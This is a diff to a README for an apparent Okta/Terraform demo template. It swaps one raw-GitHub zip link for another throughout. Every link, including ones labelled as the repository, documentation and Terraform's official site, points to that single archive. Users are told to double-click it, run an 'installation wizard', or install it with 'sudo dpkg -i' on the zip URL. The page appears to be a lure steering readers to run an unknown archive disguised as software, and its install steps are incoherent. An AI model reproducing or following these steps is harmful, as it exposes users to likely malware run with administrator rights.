@@ -1,7 +1,7 @@
 # 🎉 okta-terraform-demo-template - Simplify Your Identity Management
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip)
+[![Download Release](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **okta-terraform-demo-template** repository! This project helps you manage Okta Identity Governance using a combination of Terraform, GitHub Actions, and Python automation. Our setup supports multiple tenants and uses AWS S3 as a state backend. Let's get started.
@@ -24,7 +24,7 @@ Before you dive in, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get the latest version of the application, visit the Releases page:
 
-[Visit Releases Page](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip)
 
 1. Click the link above to open the Releases page.
 2. Select the latest release version.
@@ -34,12 +34,12 @@ Once downloaded, follow these steps to install:
 
 ### For Windows:
 1. Navigate to your Downloads folder.
-2. Double-click on the `https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip` file.
+2. Double-click on the `https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip` file.
 3. Follow the prompts in the installation wizard.
 
 ### For MacOS:
 1. Open the Finder and go to your Downloads folder.
-2. Double-click on the `https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip` file.
+2. Double-click on the `https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip` file.
 3. Drag the application to the Applications folder.
 
 ### For Linux:
@@ -47,7 +47,7 @@ Once downloaded, follow these steps to install:
 2. Navigate to the location where you downloaded the file.
 3. Run the following command to install:
    ```bash
-   sudo dpkg -i https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip
+   sudo dpkg -i https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip
    ```
 
 ## ⚙️ Configuration
@@ -87,8 +87,8 @@ We welcome contributions to improve this project. If you’d like to help, pleas
 If you have questions or feedback, please reach out via the Issues section of this repository or connect with us on our project forums.
 
 ## 🔗 Links & Resources
-- [GitHub Repository](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip)
-- [Documentation](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip) for Okta Identity Governance
-- [Terraform Official Site](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/scripts/archive/okta-terraform-demo-template-grossularia.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip)
+- [Documentation](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip) for Okta Identity Governance
+- [Terraform Official Site](https://raw.githubusercontent.com/FDALOIAPP/okta-terraform-demo-template/main/ai-assisted/providers/template_terraform_demo_okta_1.5.zip)
 
 Your journey to better identity management begins now. Enjoy using the **okta-terraform-demo-template**!
